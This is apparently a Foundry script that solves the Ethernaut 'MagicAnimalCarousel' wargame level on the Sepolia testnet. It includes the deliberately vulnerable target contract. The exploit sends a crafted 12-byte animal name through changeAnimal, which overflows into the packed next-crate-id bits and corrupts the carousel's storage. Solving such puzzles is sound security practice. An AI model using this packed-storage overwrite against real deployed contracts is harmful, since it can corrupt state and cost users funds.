// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked33_MagicAnimalCarouselScript --broadcast
contract Cracked33_MagicAnimalCarouselScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = payable(vm.parseAddress(vm.envString("MagicAnimalCarousel_address")));
    }

    function run() public {
        address player = vm.parseAddress(vm.envString("player"));
        vm.startBroadcast(player);
        string memory shortAnimal = "tuzi";
        bytes memory longAnimal = hex"10000000000000000000ffff";

        require(bytes(longAnimal).length > 10, "too short");
        require(bytes(longAnimal).length <= 12, "too long");

        MagicAnimalCarousel mac = MagicAnimalCarousel(ethernaut_contracts);
        mac.setAnimalAndSpin(shortAnimal);

        uint256 crateId = mac.currentCrateId();
        console.log("crateId is", crateId);
        uint256 oldcarousel = mac.carousel(crateId);
        console.log("oldcarousel is", oldcarousel);
        mac.changeAnimal(string(longAnimal), crateId);
        uint256 newcarousel = mac.carousel(crateId);
        console.log("newcarousel is", newcarousel);
        mac.setAnimalAndSpin("gouzi");
        require(oldcarousel != newcarousel);
        vm.stopBroadcast();
    }
}

contract MagicAnimalCarousel {
    uint16 public constant MAX_CAPACITY = type(uint16).max;
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << (160 + 16);
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);

    uint256 public currentCrateId;
    mapping(uint256 crateId => uint256 animalInside) public carousel;

    error AnimalNameTooLong();

    constructor() {
        carousel[0] ^= 1 << 160;
    }

    function setAnimalAndSpin(string calldata animal) external {
        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;

        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
        carousel[nextCrateId] = ((carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << (160 + 16))) | (((nextCrateId + 1) % MAX_CAPACITY) << 160) | uint160(msg.sender);

        currentCrateId = nextCrateId;
    }

    function changeAnimal(string calldata animal, uint256 crateId) external {
        address owner = address(uint160(carousel[crateId] & OWNER_MASK));
        if (owner != address(0)) {
            require(msg.sender == owner);
        }
        uint256 encodedAnimal = encodeAnimalName(animal);
        if (encodedAnimal != 0) {
            // Replace animal
            carousel[crateId] = (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender);
        } else {
            // If no animal specified keep same animal but clear owner slot
            carousel[crateId] = (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
        }
    }

    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
        require(bytes(animalName).length <= 12, AnimalNameTooLong());
        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
    }
}
